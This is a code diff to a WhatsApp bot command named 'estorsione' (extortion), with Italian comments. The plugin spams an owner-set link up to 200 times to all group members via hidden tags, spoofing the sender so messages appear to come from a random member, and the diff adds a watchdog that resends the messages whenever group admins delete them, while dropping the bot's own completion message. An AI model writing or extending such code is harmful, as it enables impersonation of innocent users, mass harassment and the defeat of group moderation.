@@ -4,13 +4,15 @@
 //  ESTORSIONE — Vex Bot (solo OWNER)
 //  L'owner imposta il link nella chat privata del bot: `.estorsione set <link>`.
 //  Nei gruppi: `.estorsione <n>` spamma il link n volte (max 200) con HIDE TAG
-//  a tutti i membri. I messaggi partono via relay con la key "spoofata"
-//  (sender = un membro a caso del gruppo): WhatsApp li mostra come se fossero
-//  di quel membro, quindi gli admin del gruppo NON li possono cancellare.
+//  a tutti i membri e NON invia alcun messaggio finale. I messaggi partono via
+//  relay con la key "spoofata" (sender = un membro a caso) e, se gli admin li
+//  cancellano, il watchdog di lib/estorsione li RIMANDA subito: il link non si
+//  riesce a eliminare (sessione attiva 15 min).
 // ─────────────────────────────────────────────────────────────────────────────
 
 const SEP = '━━━━━━━━━━━━━━━━━━';
 const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+const estorsione = require('../../lib/estorsione');
 
 const MAX_SPAM = 200;
 const SPAM_DELAY = 400; // ms tra un messaggio e l'altro (evita rate-limit)
@@ -105,6 +107,10 @@ ${SEP}
         if (!Number.isInteger(times) || times < 1) times = 10;
         times = Math.min(times, MAX_SPAM);
 
+        // Arma il watchdog anti-cancellazione: se gli admin eliminano i
+        // messaggi, il bot li rimanda subito (la sessione scade da sola).
+        estorsione.startSession(from, link);
+
         try {
             const meta = await sock.groupMetadata(from);
             const participants = Array.isArray(meta.participants) ? meta.participants : [];
@@ -149,17 +155,8 @@ ${SEP}
                 if (i < times - 1) await new Promise(r => setTimeout(r, SPAM_DELAY));
             }
 
-            return reply(
-`✅ *_ESTORSIONE COMPLETATA_*
-${SEP}
-▸ Link inviato *${times}* volte
-  con hide tag a *${allJids.length}*
-  membri.
-▸ 💀 Messaggi NON cancellabili:
-  appaiono come inviati da altri
-  membri del gruppo.
-${SEP}
-◈ _Vex Bot_`);
+            // Nessun messaggio finale: il comando invia SOLO il link.
+            return;
         } catch (e) {
             console.error('[estorsione]', e.message);
             return reply(
